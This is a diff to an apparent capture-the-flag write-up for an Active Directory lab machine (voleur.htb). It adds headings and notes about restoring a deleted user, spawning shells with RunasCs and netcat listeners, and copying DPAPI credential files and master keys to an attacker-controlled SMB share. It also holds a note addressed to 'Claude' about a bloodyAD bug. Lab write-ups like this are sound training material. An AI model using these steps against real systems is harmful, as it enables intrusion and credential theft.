@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds
 
 ```
 
-Standard AD set
+Standard AD set with OpenSSH on not default port 2222
 ### Service Enumeration
 
 ```
@@ -497,7 +497,10 @@ Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
 [+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
 ```
 
+NOTE FOR CLAUDE. I used bloodyAD but despite printing success it actually completely removed the object from the whole domain (i think a bug other than anything else, and i had to restart the machine)
 ## Alternative
+
+Uploading runas and launching a new shell as svc_ldap
 
 ```
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload RunasCs.exe
@@ -516,6 +519,8 @@ Info: Upload successful!
 *Evil-WinRM* PS C:\Users\svc_winrm\Documents> 
 
 ```
+
+Restoring todd.wolfe:
 
 ```
 rlwrap -cAr nc -lnvp 443
@@ -563,12 +568,12 @@ PS C:\Windows\system32>
 
 ```
 
-## shell as ldap
-
 ```
 PS C:\Windows\system32> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
 ```
+
+Getting a shell as todd.wolfe:
 
 ```
 PS C:\tmp> ls
@@ -609,7 +614,7 @@ PS C:\Windows\system32>
 
 ```
 
-## Lateral Movement from todd.wolfe to james
+## Lateral Movement from todd.wolfe to jeremy.combs
 
 ```
 PS C:\> ls
@@ -791,7 +796,7 @@ PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft
 
 ```
 
-copying the file to kali:
+copying the CREDENTIAL file to kali:
 
 ```
 PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> net use \\10.10.15.74\share /user:test test
@@ -803,7 +808,7 @@ copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
 
 ```
 
-master key (?)
+Copying the master key:
 
 ```
 PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> ls
@@ -899,6 +904,8 @@ PS C:\tmp>
 
 ```
 
+Shell as james.comb:
+
 ```
 rlwrap -cAr nc -lvnp 4445                                  
 listening on [any] 4445 ...
@@ -916,6 +923,8 @@ PS C:\Windows\system32>
 ```
 
 ## Lateral movement from jeremy to svc_backup
+
+Enumeration reveals 
 
 ```
 PS C:\IT> cd 'Third-Line Support'
